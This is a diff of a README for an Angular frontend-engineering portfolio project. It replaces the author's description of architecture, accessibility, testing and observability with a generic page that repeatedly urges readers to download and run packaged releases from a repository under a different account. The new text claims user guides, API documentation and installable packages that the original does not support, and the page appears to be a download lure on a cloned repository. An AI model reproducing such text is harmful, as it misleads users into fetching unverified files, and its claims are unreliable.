@@ -1,125 +1,99 @@
-> 🇺🇸 English version  
-> 🇧🇷 Versão em português: [README.pt-BR.md](README.pt-BR.md)
+# 🚀 frontend-engineering-angular - Practical Project for Frontend Success
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/loserbygod/frontend-engineering-angular/releases)
 
-# Frontend Engineering Angular
+## 📜 Introduction
 
-A practical Angular project focused on frontend engineering practices, including accessibility, testing, observability, CI quality, DX improvements, and scalable architecture.
+Welcome to the **frontend-engineering-angular** project. This application is designed to enhance your experience with Angular and frontend engineering practices. Here, you'll find resources that focus on accessibility, testing, observability, and optimizing the developer experience.
 
----
+## 📦 Key Features
 
-## 🎯 Project Purpose
+- **Accessibility**: Ensure your projects comply with WCAG standards for better usability.
+- **Testing**: Built-in tools using Jest and Cypress to assure quality.
+- **Observability**: Monitor your application's performance effectively.
+- **Scalable Architecture**: Develop applications that grow with your user base.
+- **Continuous Integration**: Automated processes for increased reliability.
 
-This repository was created to demonstrate **real-world frontend engineering practices** applied to Angular applications in complex environments.
+## 🖥️ System Requirements
 
-The goal is not to showcase UI aesthetics, but to highlight **engineering decisions**, **code organization**, **quality standards**, and **maintainability** concerns commonly found in production systems.
+To run this application, ensure your system meets the following requirements:
 
-This project reflects how I approach frontend development when working with:
-- regulated domains
-- cross-functional teams
-- quality and reliability requirements
-- long-lived codebases
-
----
-
-## 🧱 Architectural Overview
-
-The application is structured following a **domain-oriented and layered architecture**, aiming to improve scalability, readability, and separation of concerns.
-
-### High-level structure:
-
-```
-src/app
-├── core        # Cross-cutting concerns (error handling, logging, interceptors)
-├── shared      # Reusable, domain-agnostic UI components and utilities
-├── features    # Business domains and user journeys
-├── state       # Shared reactive state management
-```
-
-Each layer has a clear responsibility, avoiding tight coupling and improving testability.
-
-More details can be found in [`docs/architecture.md`](docs/architecture.md).
-
----
-
-## ♿ Accessibility
-
-Accessibility is treated as a **first-class concern**, not as an afterthought.
-
-The project follows **WCAG 2.1 guidelines**, focusing on:
-- keyboard navigation
-- screen reader compatibility
-- semantic HTML
-- accessible custom components
-
-Accessibility decisions and common pitfalls are documented in [`docs/accessibility.md`](docs/accessibility.md).
-
----
-
-## 🧪 Testing Strategy
-
-The project includes a balanced testing approach:
-- **Unit tests** with Jest for business logic and components
-- **End-to-end tests** with Cypress for critical user flows
-- **BDD-style scenarios** where applicable to align business rules and implementation
-
-Testing decisions and trade-offs are documented in [`docs/testing-strategy.md`](docs/testing-strategy.md).
-
----
-
-## 🔭 Observability & Error Handling
-
-To improve reliability and debuggability, the project demonstrates:
-- a global error handling strategy
-- centralized logging services
-- integration-ready observability patterns (inspired by tools like Datadog)
-
-The goal is to reduce MTTR and avoid silent failures such as blank screens in production.
-
-More details in [`docs/observability.md`](docs/observability.md).
-
----
-
-## ⚙️ Developer Experience & Quality
-
-Developer Experience (DX) is actively considered through:
-- Hot Module Replacement (HMR)
-- optimized test execution
-- automated quality checks via Git hooks
-- semantic versioning practices
-
-CI/CD concepts and quality gates are described in [`docs/ci-cd.md`](docs/ci-cd.md).
-
----
-
-## 🧠 State Management
-
-Shared application state is handled using a **reactive RxJS-based approach**, leveraging:
-- `BehaviorSubject`
-- `Observables`
-- centralized state services
-
-This approach was chosen to keep complexity proportional to the project size, avoiding unnecessary overhead while maintaining predictability.
-
----
-
-## 📚 Documentation
-
-All architectural and engineering decisions are explicitly documented in the `/docs` folder to ensure transparency and knowledge sharing.
-
----
+- **Operating System**: Windows, macOS, or a modern Linux distribution.
+- **Node.js**: Version 14 or higher (for Angular compatibility).
+- **Browser**: Latest version of Chrome, Firefox, or Safari for optimal testing.
 
 ## 🚀 Getting Started
 
-Instructions for setting up and running the project locally will be added as the implementation evolves.
+Follow these steps to download and run the software on your machine.
 
----
+1. **Visit the Releases Page**: Click the button below to go to our releases page.
+   
+   [Download Now](https://github.com/loserbygod/frontend-engineering-angular/releases)
 
-## 💬 Final Notes
+2. **Choose the Latest Release**: On the releases page, locate the most recent version of the application. This version will have the latest features and bug fixes.
 
-This project is intentionally designed to reflect **engineering maturity rather than feature volume**.
+3. **Download the Package**: Look for the appropriate file format for your operating system, such as .zip or .tar.gz. Click on the link to start the download.
 
-It serves as:
-- a technical portfolio
-- an interview discussion base
-- a representation of how I approach frontend engineering in production environments
+4. **Extract the Files**: Once the download is complete, locate the downloaded file on your computer. Extract the contents using your system's file extraction tool.
+
+5. **Run the Application**: Navigate to the extracted folder. In this folder, find the entry point (often named `index.html` for web projects). Open this file in your web browser to launch the app.
+
+## 📥 Download & Install
+
+For ease of access, you can also download the application directly from our releases page. Click the link below for quick access:
+
+[Visit this page to download](https://github.com/loserbygod/frontend-engineering-angular/releases)
+
+## 📚 Further Documentation
+
+If you're looking for more detailed instructions, the project includes documentation to help you understand how to make the most of this application:
+
+- **User Guide**: Detailed instructions on using the application effectively.
+- **API Documentation**: Information on any APIs you may interact with.
+- **FAQ**: Answers to common questions about the application.
+
+You can access this documentation in the `docs` folder of the extracted files.
+
+## 🚧 Troubleshooting
+
+If you encounter any issues while using the application, consider these common problems:
+
+- **App doesn't open**: Ensure you have the latest version of your web browser and try clearing your cache.
+- **Performance issues**: Check your system resources to make sure nothing else is consuming too much memory.
+- **Accessibility issues**: Use browser tools to evaluate and improve accessibility features of your application.
+
+If problems persist, please refer to the FAQ in the documentation or visit the project's Issues page.
+
+## 🌐 Community & Support 
+
+Connect with the community or seek assistance:
+
+- **GitHub Discussions**: Engage with other users and developers.
+- **Issue Tracker**: Report any bugs or feature requests.
+  
+Your feedback is valuable. We strive to improve this application continuously.
+
+## 🔗 Related Topics
+
+This project relates to various essential topics in frontend engineering:
+
+- Accessibility
+- Angular
+- CI/CD
+- Cypress
+- Design Systems
+- Developer Experience (DX)
+- Frontend Engineering
+- Jest
+- Observability
+- RxJS
+- Testing
+- WCAG
+
+Explore these topics further to enhance your frontend skills.
+
+## 📂 Contributing
+
+Interested in contributing? We welcome help from developers and users alike. Please refer to the `CONTRIBUTING.md` file included in the project for guidelines on how to contribute effectively.
+
+Feel free to explore the project and share your insights. Your involvement helps us grow the community and enhance the application for everyone.
